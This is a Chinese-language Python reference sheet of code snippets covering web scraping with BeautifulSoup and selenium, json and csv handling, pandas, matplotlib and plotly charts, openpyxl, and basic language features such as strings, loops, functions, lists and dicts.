1 print(soup.prettify()) 取得屬性 - .attrs 1 2 3 4 5 print(soup.a.attrs) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;href\u0026#39;: \u0026#39;http://www.icourse163.org/course/BIT-268001\u0026#39;, \u0026#39;class\u0026#39;: [\u0026#39;py1\u0026#39;], \u0026#39;id\u0026#39;: \u0026#39;link1\u0026#39;} 取得tag內容 - .string/.text 1 2 3 4 5 print(soup.a.string) print(soup.a.text) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Basic Python\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;Basic Python\u0026#39; 找第一個標籤 - .find(\u0026quot;標籤\u0026quot;) 1 2 3 soup.find(\u0026#34;a\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;a class=\u0026#34;py1\u0026#34; href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt; 找全部的標籤 - .find_all(\u0026quot;標籤\u0026quot;, class_=\u0026quot;className\u0026quot;) 可加上class做篩選條件。 1 2 3 4 5 6 7 8 9 # 寫法1： soup.find_all(\u0026#34;p\u0026#34;, class_=\u0026#34;title\u0026#34;) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] # 寫法2： soup.find_all(\u0026#34;p\u0026#34;, {\u0026#34;class\u0026#34;=\u0026#34;title\u0026#34;}) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] 透過選擇器篩選標籤 - .select(同CSS選擇器,Class或ID) 若有空格會有問題，soup.select(.\u0026quot;title p\u0026quot;) 會報錯，空格需使用.find()、.findAll() 1 2 3 4 5 6 7 # 使用Class選擇器 print(soup.select(\u0026#34;.title\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] # 使用ID選擇器 print(soup.select(\u0026#34;#link1\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;a class=\u0026#34;py1\u0026#34; href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt;] json模組 載入模組 1 import json json轉dict - json.loads(\u0026quot;字串\u0026quot;) 1 2 3 4 5 6 7 import json txt = \u0026#39;{ \u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34; }\u0026#39; data = json.loads(txt) print(type(data)) # 字典型態 \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026lt;class \u0026#39;dict\u0026#39;\u0026gt;\u0026#39; dict轉json string - json.dumps(\u0026quot;字典\u0026quot;) 1 2 3 4 5 6 7 import json txt = { \u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34; } jsonData = json.dumps(txt) print(jsonData) # 轉換後為json格式的字串 \u0026gt;\u0026gt;\u0026gt; {\u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34;} csv模組 載入模組 1 import csv 以_csv.reader型態讀取csv檔 - csv.reader(檔案) 1 2 3 4 5 6 import csv with open(\u0026#39;MI_5MINS_HIST.csv\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as file: rows = csv.reader(file) # 一筆一筆取出資料 for row in rows: print(row) 以dict型態讀取csv檔 - csv.DictReader(檔案) 1 2 3 4 5 6 import csv with open(\u0026#39;MI_5MINS_HIST.csv\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as file: rows = csv.DictReader(file) # 一筆一筆取出資料 for row in rows: print(row) 寫入csv檔 - csv.writer(檔案變數) 需先定義一個物件為csv.writer()，在進行寫入。 writerow() ：單行寫入 1 2 3 4 5 6 with open(\u0026#39;Temp.csv\u0026#39;, \u0026#39;w\u0026#39;) as csvfile: writer = csv.writer(csvfile) writer.writerow([\u0026#39;姓名\u0026#39;, \u0026#39;身高\u0026#39;, \u0026#39;體重\u0026#39;]) writer.writerow([\u0026#39;Jessica\u0026#39;, 158, 45]) writer.writerow([\u0026#39;Wayne\u0026#39;, 172, 60]) 以字典型態寫入csv檔 - csv.DictWriter(檔案變數, fieldnames=欄位變數(列表型態)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 with open(\u0026#39;DictTemp.csv\u0026#39;, \u0026#39;w\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as csvfile: # 設定欄位變數 rowNames = [\u0026#39;姓名\u0026#39;, \u0026#39;身高\u0026#39;, \u0026#39;體重\u0026#39;] # fieldnames = 指定欄位 writer = csv.DictWriter(csvfile, fieldnames=rowNames) # 寫入欄位名稱 writer.writeheader() #寫入資料 writer.writerow({\u0026#39;姓名\u0026#39;: \u0026#39;Jessica\u0026#39;, \u0026#39;身高\u0026#39;: 156, \u0026#39;體重\u0026#39;: 45}) writer.writerow({\u0026#39;姓名\u0026#39;: \u0026#39;Wayne\u0026#39;, \u0026#39;身高\u0026#39;: 172, \u0026#39;體重\u0026#39;: 60}) 模擬瀏覽器模組(自動化測試) - selenium 安裝 selenium 模組 Anaconda編譯器的話，使用Anaconda Prompt 1 2 ### anaconda 安裝 selenium 模組 conda install selenium 1 2 ### 使用 pip 安裝 selenium 模組 pip install selenium 下載瀏覽器驅動(web driver)\n先查看chrome瀏覽器的版本，Google：Web driver chrome後下載。\n載入模組\n1 from selenium import webdriver 實例化一個瀏覽器視窗(Chrome)，並設定一個瀏覽器物件 檔案名稱勿與selenium模組名稱相同以免衝突而無法執行 1 2 3 from selenium import webdriver driver = webdriver.Chrome() 發送GET請求 - 瀏覽器物件.get(網址) 1 driver.get(\u0026#34;http://www.baidu.com\u0026#34;) 根據dom元件的id/class定位 - 瀏覽器物件.find_element_by_id(id) 或 瀏覽器物件.find_element_by_class(class) 1 2 # 找到id為\u0026#34;kw\u0026#34;的input，並輸入\u0026#34;python\u0026#34; driver.find_element_by_id(\u0026#34;kw\u0026#34;).send_keys(\u0026#34;python\u0026#34;) 送出表單 - 瀏覽器物件.dom元件.submit() 1 2 # 送出id為\u0026#34;su\u0026#34;的表單 driver.find_element_by_id(\u0026#34;su\u0026#34;).submit() 點擊事件 - 瀏覽器物件.dom元件.click() 1 2 # 送出id為\u0026#34;btn\u0026#34;的按鈕 driver.find_element_by_id(\u0026#34;btn\u0026#34;).click() 取得頁面原始碼 - .page_source 1 SourceHtml = driver.page_source 螢幕截圖 - 瀏覽器物件.save_screenshot(截圖的圖檔名稱) 1 driver.save_screenshot(\u0026#34;screen.png\u0026#34;) 獲取cookies - 瀏覽器物件.get_cookie() 1 2 cookies = driver.get_cookie() print(cookies) 關閉實例化的瀏覽器視窗 - 瀏覽器物件.close() 或 瀏覽器物件.quit() 1 2 driver.close() # 或 driver.quit() 資料分析模組 - Pandas 載入模組 1 import pandas 解析list類型 - pandas物件.Series(資料) 1 2 3 4 5 6 7 8 9 import pandas data = [20, 10, 15] pds = pandas.Series(data) print(pds) \u0026gt;\u0026gt;\u0026gt; 0 20 \u0026gt;\u0026gt;\u0026gt; 1 10 \u0026gt;\u0026gt;\u0026gt; 2 15 \u0026gt;\u0026gt;\u0026gt; dtype: int64 解析Data類型 - pandas物件.DataFrame(字典型態的資料) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 data = pandas.DataFrame({ \u0026#34;name\u0026#34;: [\u0026#34;Amy\u0026#34;, \u0026#34;Jack\u0026#34;, \u0026#34;Cathy\u0026#34;], \u0026#34;salary\u0026#34;: [1000, 5000, 2000] }) print(data) \u0026gt;\u0026gt;\u0026gt; name salary \u0026gt;\u0026gt;\u0026gt; 0 Amy 1000 \u0026gt;\u0026gt;\u0026gt; 1 Jack 5000 \u0026gt;\u0026gt;\u0026gt; 2 Cathy 2000 # 取特定欄位 print(data[salary]) \u0026gt;\u0026gt;\u0026gt; 0 1000 \u0026gt;\u0026gt;\u0026gt; 1 5000 \u0026gt;\u0026gt;\u0026gt; 2 2000 可指定x軸或y軸欄位名稱(columns, index) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import pandas data = [ [65,92,78,83,70], [62,96,81,63,71], [45,58,30,53,75], [90,91,70,90,100], ] index = [\u0026#34;張三\u0026#34;, \u0026#34;李四\u0026#34;, \u0026#34;王五\u0026#34;, \u0026#34;趙雲\u0026#34;] columns = [\u0026#34;國文\u0026#34;, \u0026#34;數學\u0026#34;, \u0026#34;英文\u0026#34;, \u0026#34;自然\u0026#34;, \u0026#34;社會\u0026#34;] df = pandas.DataFrame(data, columns = columns, index = index) print(df) \u0026gt;\u0026gt;\u0026gt; 國文 數學 英文 自然 社會 \u0026gt;\u0026gt;\u0026gt; 張三 65 92 78 83 70 \u0026gt;\u0026gt;\u0026gt; 李四 62 96 81 63 71 \u0026gt;\u0026gt;\u0026gt; 王五 45 58 30 53 75 \u0026gt;\u0026gt;\u0026gt; 趙雲 90 91 70 90 100 回傳最大值 - Data資料.max() 1 2 3 4 5 data = [20, 10, 15] pds = pandas.Series(data) print(pds.max()) \u0026gt;\u0026gt;\u0026gt; 20 回傳最小值 - 資料.min() 1 2 3 4 5 data = [20, 10, 15] pds = pandas.Series(data) print(pds.min()) \u0026gt;\u0026gt;\u0026gt; 10 取得指定欄位 - Data資料.loc[x][y] 1 2 3 4 5 6 7 8 9 10 11 12 13 data = pandas.DataFrame({ \u0026#34;name\u0026#34;: [\u0026#34;Amy\u0026#34;, \u0026#34;Jack\u0026#34;, \u0026#34;Cathy\u0026#34;], \u0026#34;salary\u0026#34;: [1000, 5000, 2000] }) print(data) print(data.loc[0][1]) \u0026gt;\u0026gt;\u0026gt; name salary \u0026gt;\u0026gt;\u0026gt; 0 Amy 1000 \u0026gt;\u0026gt;\u0026gt; 1 Jack 5000 \u0026gt;\u0026gt;\u0026gt; 2 Cathy 2000 \u0026gt;\u0026gt;\u0026gt; 1000 輸出成csv(或json)檔案 - Data資料.to_csv(\u0026quot;檔名\u0026quot;, encoding=\u0026quot;編碼\u0026quot;) 或 Data資料.to_json(\u0026quot;檔名\u0026quot;, encoding=\u0026quot;編碼\u0026quot;) 1 2 3 4 5 6 7 8 9 10 11 import pandas data = [ [65,92,78,83,70], [62,96,81,63,71], [45,58,30,53,75], [90,91,70,90,100] ] index = [\u0026#34;張三\u0026#34;, \u0026#34;李四\u0026#34;, \u0026#34;王五\u0026#34;, \u0026#34;趙雲\u0026#34;] columns = [\u0026#34;國文\u0026#34;, \u0026#34;數學\u0026#34;, \u0026#34;英文\u0026#34;, \u0026#34;自然\u0026#34;, \u0026#34;社會\u0026#34;] df = pandas.DataFrame(data, columns = columns, index = index) df.to_csv(\u0026#39;temp.csv\u0026#39;, encoding=\u0026#34;utf-8-sig\u0026#34;) 繪圖模組 - plot 載入模組 1 import matplotlib.pyplot as plt 畫折線圖 - .plot(X軸資料, Y軸資料) 1 2 3 4 5 6 7 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # 畫出折線圖 plt.plot(x1, y1) 顯示Label - .legend() 要顯示label需執行此function :為點線, --為虛線, 不指定預設為實線 1 2 3 4 5 6 7 8 9 10 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # :為點線, --為虛線, 不指定預設為實線 plt.plot(x1, y1, label=\u0026#34;food\u0026#34;, color=\u0026#34;red\u0026#34;, linestyle=\u0026#34;:\u0026#34;) #要顯示label - 需執行legend() plt.legend() 指定圖表標題 - .title() 1 plt.title(\u0026#34;學生成績\u0026#34;) 指定X/Y軸標題 - .xlabel(X軸標題) / .ylabel(Y軸標題) 1 2 plt.xlabel(\u0026#34;X軸標題\u0026#34;) plt.ylabel(\u0026#34;Y軸標題\u0026#34;) 畫長條圖 - .bar(X軸資料, Y軸資料) 1 2 3 4 5 6 7 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # 畫出長條圖 plt.bar(x1, y1) 畫圓餅圖 - .pie(資料) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import matplotlib.pyplot as plt datas = [5,10,20,15] # 畫出圓餅圖 plt.pie(datas) # 讓特定區塊凸出(需與資料數量相同) explode = [0,0,0.05,0] plt.pie(datas, explode = explode) # 指定每個區塊的標題 labels = [\u0026#34;東部\u0026#34;,\u0026#34;南部\u0026#34;,\u0026#34;西部\u0026#34;,\u0026#34;北部\u0026#34;] plt.pie(sizes, labels = labels) # 顯示百分比 plt.pie(sizes,autopct=\u0026#34;%3.1f%%\u0026#34;) 繪圖模組2 - plotly 安裝 plotly 模組 Anaconda編譯器的話，需使用Anaconda Prompt安裝。 使用Jupyter Notebook編輯 1 2 ### anaconda 安裝 plotly 模組 conda install plotly 載入模組(並指定繪圖模式) 1 2 3 4 import plotly # 指定繪圖模式：Scatter, Bar, Pie, Box, Scattergeo, Histogram from plotly.graph_objs import Scatter # 折線散點圖 在線繪圖需收費，需使用離線繪圖 1 plotly.offline.init_notebook_mode(connected=True) 指定X/Y軸資料 1 data = [Scatter(x=[\u0026#34;林大名\u0026#34;, \u0026#34;陳聰明\u0026#34;, \u0026#34;黃美麗\u0026#34;], y=[67,89,72])] 畫出折線圖 1 2 data = [Scatter(x=[\u0026#34;林大名\u0026#34;, \u0026#34;陳聰明\u0026#34;, \u0026#34;黃美麗\u0026#34;], y=[67,89,72])] plotly.offline.iplot({\u0026#34;data\u0026#34;:data}) 指定繪圖的mode 1 2 3 # markers：只有點 / lines：只有線 / lines + markers：點 + 線 data = [Scatter(x=[\u0026#34;林大名\u0026#34;, \u0026#34;陳聰明\u0026#34;, \u0026#34;黃美麗\u0026#34;], y=[67,89,72], mode=\u0026#34;markers\u0026#34;)] plotly.offline.iplot({\u0026#34;data\u0026#34;:data}) 指定圖表標題(繪圖模式須import Layout) 1 2 3 4 5 6 7 8 9 10 11 12 import plotly from plotly.graph_objs import Scatter, Layout # 離線繪圖模式 plotly.offline.init_notebook_mode(connected=True) data = [Scatter(x=[\u0026#34;林大名\u0026#34;, \u0026#34;陳聰明\u0026#34;, \u0026#34;黃美麗\u0026#34;], y=[67,89,72])] # 指定圖表標題 plotly.offline.iplot({\u0026#34;data\u0026#34;:data, \u0026#34;layout\u0026#34;:Layout(title=\u0026#34;成績單\u0026#34;)}) Excel模組 - openpyxl 載入模組 1 import openpyxl 建立工作簿物件 - openpyxl.Workbook() 1 2 # 工作簿物件 workbook = openpyxl.Workbook() 取得指定工作表 1 2 # 工作表物件 sheet = workbook.worksheets[0] 鍵入值 方法一：行列插入 1 2 3 # sheet：工作表物件 sheet[\u0026#39;A1\u0026#39;] = \u0026#34;欄位一\u0026#34; sheet[\u0026#39;B1\u0026#39;] = \u0026#34;欄位二\u0026#34; 方法二：自動換行插入 1 2 3 # sheet：工作表物件 listTitle = [\u0026#34;姓名\u0026#34;, \u0026#34;電話\u0026#34;] sheet.append(listTitle) 取得特定欄位的值 - .value 1 sheet[\u0026#39;A1\u0026#39;].value 存檔 - 工作簿物件.save(檔名) 1 workbook.save(\u0026#39;test.xlsx\u0026#39;) 取檔 - openpyxl.load_workbook(檔名) 1 workbook = openpyxl.load_workbook(\u0026#39;test.xlsx\u0026#39;) 取得總行數 - 工作表物件.max_row 1 print(sheet.max_row) 取得總列數 - 工作表物件.max_column 1 print(sheet.max_column) 到指定欄位 - 工作表物件.cell(row=指定行數, column=指定列數) 1 2 # 印出第3行第2列的值 print(sheet.cell(row=3, column=2).value) Python 資料型態 資料型態說明 資料型態 說明 str 字串 int 整數 bool 布林值 float 浮點數 None 空值 list [] 列表，同Array tuple () 不可變更的Array dict {} 字典，同Object set () 集合，同Object，但key為索引值 Python 運算子 基本運算子 運算子 說明 + 加：數值相加,字串相連接 - 減 * 乘：數值相乘,字串可乘數值(python獨有) / 浮點數除 ** 平方 **0.5 開根號 // 整數除 % 取餘數 指派運算子 運算子 說明 += 原值等於原值加 -= 原值等於原值減 *= 原值等於原值乘 /= 原值等於原值除 判斷運算子 運算子 說明 \u0026gt; 大於 \u0026lt; 小於 == 等於 != 不等於 \u0026gt;= 大於等於 \u0026lt;= 小於等於 邏輯運算子 運算子 說明 and 並且 or 或者 not 反向 Python 函式 回傳資料型態 - type() 1 2 3 4 5 6 7 8 type(3) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; type(\u0026#39;a\u0026#39;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;str\u0026#39;\u0026gt; type(True) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt; type(None) # Python的空值為None \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;NoneType\u0026#39;\u0026gt; 輸入窗 - input() 1 2 3 4 myName = input(\u0026#34;請輸入姓名：\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 請輸入姓名：jessica # 輸入名字後 print(myName) # 取輸入的名字 \u0026gt;\u0026gt;\u0026gt; jessica 字串轉數值 - eval() 1 2 3 num = eval(\u0026#34;3\u0026#34;) print(type(num)) \u0026gt;\u0026gt;\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; 特殊符號轉十進位編號 - ord() / chr() 1 2 3 4 5 6 7 # ord 將特殊符號轉換成十進位編號 ord(\u0026#39;⤅\u0026#39;) \u0026gt;\u0026gt;\u0026gt; 10501 # chr 將十進位編號轉換成特殊符號 chr(10501) \u0026gt;\u0026gt;\u0026gt; ⤅ 取最大 / 最小值 - max() / min() 1 2 3 4 min(1, 2, 45, 100) \u0026gt;\u0026gt;\u0026gt; 1 max(1, 2, 45, 100) \u0026gt;\u0026gt;\u0026gt; 100 取絕對數值 - abs() 1 2 abs(-3.14) \u0026gt;\u0026gt;\u0026gt; 3.14 進制字串轉數字 - eval() 1 2 eval(\u0026#34;0o101\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 65 數字轉字串 - str() 1 2 str(324) \u0026gt;\u0026gt;\u0026gt; \u0026#39;324\u0026#39; 字串轉數字或數字轉整數 - int() 1 2 3 4 int(\u0026#34;324\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 324 int(3.14) \u0026gt;\u0026gt;\u0026gt; 3 浮點數字串轉數字 - float() 1 2 float(\u0026#34;3.1416\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 3.1416 四捨五入 - round(數值 [,位數]) 1 2 3 4 5 6 round(3.1416) \u0026gt;\u0026gt;\u0026gt; 3 # 第二個參數可帶位數 round(3.1416, 3) \u0026gt;\u0026gt;\u0026gt; 3.142 平方 - pow(數值, 平方根) 1 2 3 # 第二個參數為平方根 pow(5, 2) \u0026gt;\u0026gt;\u0026gt; 25 取得長度 - len() 任何資料型態都通用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # String strA = \u0026#34;Hello World\u0026#34; len(strA) \u0026gt;\u0026gt;\u0026gt; 11 # Array arrA = [1, 2, 20, 50, 100] len(arrA) \u0026gt;\u0026gt;\u0026gt; 5 # Object objA = {\u0026#34;itemA\u0026#34;:\u0026#34;123\u0026#34;, \u0026#34;itemB\u0026#34;:\u0026#34;456\u0026#34;} len(objA) \u0026gt;\u0026gt;\u0026gt; 2 編碼 / 解碼 - encode() / decode() 1 2 3 4 5 \u0026#34;中\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) \u0026gt;\u0026gt;\u0026gt; b\u0026#39;\\xe4\\xb8\\xad\u0026#39; b\u0026#39;\\xe4\\xb8\\xad\u0026#39;.decode(\u0026#34;utf-8\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;中\u0026#34; 字串轉大小寫 - upper() / lower() 1 2 3 4 5 6 7 StrA = \u0026#34;Hello World!\u0026#34; # 大寫 StrA.upper() \u0026gt;\u0026gt;\u0026gt; \u0026#39;HELLO WORLD!\u0026#39; # 小寫 StrA.lower() \u0026gt;\u0026gt;\u0026gt; \u0026#39;hello world!\u0026#39; 字串取代 - replace(舊字串, 新字串) 1 2 3 StrA = \u0026#34;Hello World!\u0026#34; StrA.replace(\u0026#34;World\u0026#34;, \u0026#34;Jessica\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Hello Jessica!\u0026#39; 字串判斷的函式 函式 說明 StrA.isalpha() 是否為字母 StrA.isdigit() 是否為數字 StrA.isupper() 是否為大寫 StrA.islower() 是否為小寫 StrA.isidentifer() 是否為識別字 StrA.iskeyword() 是否為關鍵字,需要keyword模組 StrA.isspace() 是否為空白 StrA.istitle() 是否為標題字(第一個字為大寫則是標題字) 字串搜尋的函式 函式 說明 Str.count(文字A) 搜尋文字A出現的次數 StrA.startswith(文字A) 是否為文字A開頭 StrA.endswith(文字A) 是否為文字A結尾 StrA.find(文字A) 搜尋文字A的位置 StrA.rfind(文字A) 搜尋文字A最後出現的位置 印出字串 - print() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 一般的print(間隔預設自動補空格) print(1, 2, 3) \u0026gt;\u0026gt;\u0026gt; 1 2 3 # 間隔不空格 print(1, 2, 3, sep=\u0026#34;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 123 # 指定間隔文字 print(1, 2, 3, sep=\u0026#34;@\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1@2@3 # 指定結尾文字 print(1, 2, 3, sep=\u0026#34;@\u0026#34;, end=\u0026#34;!!!\u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1@2@3!!! # 格數化輸出字元(開頭帶一個小寫的\u0026#34;f\u0026#34;) print(f\u0026#39;{變數A}*{變數B}={變數A*變數B}\u0026#39;) \u0026gt;\u0026gt;\u0026gt; A * B = AB 字串格式化 - format() 取代字串中{} 1 2 3 text = \u0026#39;world\u0026#39; print(\u0026#39;hello {}\u0026#39;.format(text)) \u0026gt;\u0026gt;\u0026gt; hello world 可帶關鍵字取代 1 2 3 4 5 name = \u0026#39;Jack\u0026#39; text = \u0026#39;world\u0026#39; print(\u0026#39;hello {name}, hello {text}\u0026#39;.format(name=name, text=text)) \u0026gt;\u0026gt;\u0026gt; hello Jack, hello world 從最後面插入 - append() 1 2 3 4 list1 = [2,4,6,8] list1.append(10) \u0026gt;\u0026gt;\u0026gt; [2,4,6,8,10] 從指定位置插入 - insert(位置, 值) 1 2 3 4 list1 = [2,4,6,8,10] list1.insert(0, -1) \u0026gt;\u0026gt;\u0026gt; [-1,2,4,6,8,10] 條件判斷 條件判斷式 - if\u0026hellip; elif\u0026hellip; else\u0026hellip; 1 2 3 4 5 6 7 # 使用縮排撰寫要做的事 if 條件A: ... elif 條件B: ... else: ... 例外判斷 - try\u0026hellip; except\u0026hellip; 1 2 3 4 5 6 7 8 try: # ... except Exception: print(\u0026#34;有異常錯誤\u0026#34;) except NameError: print(\u0026#34;變數有錯誤\u0026#34;) except TypeError: print(\u0026#34;資料格式錯誤\u0026#34;) except 錯誤分類 錯誤異常判斷 說明 Exception 只要有錯誤 NameError 變數名稱錯誤 ValueError value值錯誤 ZeroDivisionError 除數/分母不可為零的錯誤 TypeError 資料格式錯誤 迴圈 技術式迴圈 - for 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 跑range for i in range(1, 6): print(i, end=\u0026#34; \u0026#34;) \u0026gt;\u0026gt;\u0026gt; 1 2 3 4 5 # 跑在字串 for c in \u0026#34;Mary\u0026#34;: print(c, end=\u0026#34; \u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;M\u0026#34; \u0026#34;a\u0026#34; \u0026#34;r\u0026#34; \u0026#34;y\u0026#34; # 跑在陣列 for e in [\u0026#34;a\u0026#34;, 3, \u0026#34;Jessica\u0026#34;] \u0026gt;\u0026gt;\u0026gt; \u0026#34;a\u0026#34; \u0026gt;\u0026gt;\u0026gt; 3 \u0026gt;\u0026gt;\u0026gt; \u0026#34;Jessica\u0026#34; 條件式迴圈 - while 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # while迴圈 i = 0 while i \u0026lt; 5: i += 1 print(i) \u0026gt;\u0026gt;\u0026gt; 1 \u0026gt;\u0026gt;\u0026gt; 2 \u0026gt;\u0026gt;\u0026gt; 3 \u0026gt;\u0026gt;\u0026gt; 4 \u0026gt;\u0026gt;\u0026gt; 5 # While判斷(反覆驗證直到ans等於\u0026#34;happy\u0026#34;) ans = input(\u0026#34;請輸入快樂的英文：\u0026#34;) while ans != \u0026#34;happy\u0026#34;: ans = input(\u0026#34;拼錯囉，再給你一次機會：\u0026#34;) else: print(\u0026#34;答對囉，是happy\u0026#34;) break：跳脫迴圈 1 2 3 4 5 6 7 8 9 ans = input(\u0026#34;請輸入快樂的英文：\u0026#34;) while ans.lower() != \u0026#34;happy\u0026#34;: # 當輸入quit時跳出迴圈 if(ans.lower() == \u0026#34;quit\u0026#34;): print(\u0026#34;猜不出來了吧，結束\u0026#34;) break; ans = input(\u0026#34;拼錯囉，再給你一次機會：\u0026#34;) else: print(\u0026#34;答對囉，是\u0026#34;, ans) continue：跳過繼續進行下一迴圈 1 2 3 4 5 6 7 8 # i遇4的因數就跳過 i = 0 while i \u0026lt;= 100: i += 1 # continue前要先加1，避免進入無窮迴圈 if i % 4 == 0: continue print(i, end=\u0026#34; \u0026#34;) 自訂函式 自定義函式 - def 一般宣告函式 1 2 3 4 5 6 7 def printStar(_n): return \u0026#34;*\u0026#34; * _n # 執行函式 print(printStar(6)) \u0026gt;\u0026gt;\u0026gt; ****** 設定參數預設值 1 2 3 4 5 6 7 8 9 10 11 def TeaTime(desserts, drink=\u0026#34;咖啡\u0026#34;): print(f\u0026#39;下午茶點心為{desserts},飲料為{drink}\u0026#39;) TeaTime(\u0026#39;馬卡龍\u0026#39;, \u0026#39;紅茶\u0026#39;) # 指定實際參數 TeaTime(\u0026#39;馬卡龍\u0026#39;) # 飲料會顯示預設值:咖啡 TeaTime() # 兩個參數都顯示預設值 \u0026gt;\u0026gt;\u0026gt; 下午茶點心為馬卡龍,飲料為紅茶 \u0026gt;\u0026gt;\u0026gt; 下午茶點心為馬卡龍,飲料為咖啡 \u0026gt;\u0026gt;\u0026gt; 下午茶點心為鬆餅,飲料為咖啡 設定不定個數參數(參數為tuple型態) 帶入參數帶星號可將帶入的參數組成一個tuple 1 2 3 4 5 6 7 8 9 def add(*numbers): total = 0 for i in numbers: total += i print(total) add(1, 2, 4, 6) \u0026gt;\u0026gt;\u0026gt; 13 實際參數帶星號可將原為tuple型態的資料拆解開來 1 2 3 4 5 6 7 8 9 def add(*numbers): total = 0 for i in numbers: total += i print(total) add(*range(0, 11)) \u0026gt;\u0026gt;\u0026gt; 55 多個回傳值 1 2 3 4 5 6 7 8 9 10 11 12 # 回傳值用逗號隔開 def divmod(x, y): div = x // y mod = x % y return div, mod # 用{a,b}接多個回傳值 a, b = divmod(100, 7) print(f\u0026#39;100除以7的商數為{a},餘數為{b}\u0026#39;) \u0026gt;\u0026gt;\u0026gt; 100除以7的商數為14,餘數為2 操作 List(列表) 建立 建立空list 1 2 3 4 5 # 方法1: list1 = [] # 方法2: list2 = list() 建立list 1 list1 = [1, \u0026#34;taipei\u0026#34;, 2, \u0026#34;tokyo\u0026#34;] # 每個的資料型態不限 從string建立list 1 list1 = list(\u0026#34;Hello\u0026#34;) # list1為 [\u0026#34;H\u0026#34;,\u0026#34;e\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;o\u0026#34;] 從range建立list 1 list1 = list(5) # list1為 [0,1,2,3,4] 從字串分割建立list 1 list1 = \u0026#34;1 2 3\u0026#34;.split() # list1為 [\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;3\u0026#34;] 刪除 刪除整個list 1 del list1 刪除list中的某一個(以第一個為例) 1 2 3 4 5 6 7 8 # 方法1 del list1[0] # 方法2 list.remove(0) # 方法3 list.pop([0]) 清除list元素(等於del list[::]) 1 2 3 4 list1 = [2,4,6,8,10] list1.clear() \u0026gt;\u0026gt;\u0026gt; [] list新增元素 1 2 3 list.append(x) # 附加元素到最後 list.extend(L) list.inser(i, x) # 插入元素至指定位置 查詢索引 1 list1.index(\u0026#39;a\u0026#39;) # 查詢a在list1的索引 統計出現的次數 1 list1.count(\u0026#39;a\u0026#39;) # 統計a在list1中出現的次數 元素排序 1 list.sort() # 原地操作 元素倒序 1 list1.reverse() # 原地操作 操作 Dict(字典) 查詢 一般查詢 1 dict1[key] # 若key值不在會報錯 以key查詢，使用dict1.get(key, [default]) - (推薦) 1 2 3 4 5 6 7 8 9 10 11 12 13 # 若無key值則顯示default dict1.get(key, [default]) #example: fruits = {\u0026#34;apple\u0026#34;:\u0026#34;30元\u0026#34;, \u0026#34;banana\u0026#34;:\u0026#34;10元\u0026#34;} Quest = input(\u0026#34;請輸入要查詢的價格的水果：\u0026#34;) print(fruits.get(Quest, \u0026#34;查無此水果\u0026#34;)) \u0026lt;\u0026lt;\u0026lt; apple \u0026gt;\u0026gt;\u0026gt; 30元 